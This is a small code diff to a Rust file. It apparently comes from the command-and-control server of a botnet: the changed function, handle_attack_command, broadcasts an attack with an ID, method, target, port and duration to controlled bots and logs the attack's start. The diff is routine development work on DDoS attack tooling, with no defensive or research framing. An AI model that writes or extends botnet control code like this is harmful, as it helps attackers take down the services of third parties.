@@ -109,7 +109,7 @@ pub async fn handle_attack_command(client: &Arc<Client>, state: &Arc<AppState>, 
     ).await {
         Ok(attack_id) => {
             // Send command to bots
-            state.bot_manager.broadcast_attack(&method_str, &resolved_target, port, duration).await;
+            state.bot_manager.broadcast_attack(attack_id, &method_str, &resolved_target, port, duration).await;
 
             // Log attack
             let audit_event = AuditLog::new(client.user.username.clone(), "START_ATTACK".to_string(), "SUCCESS".to_string())
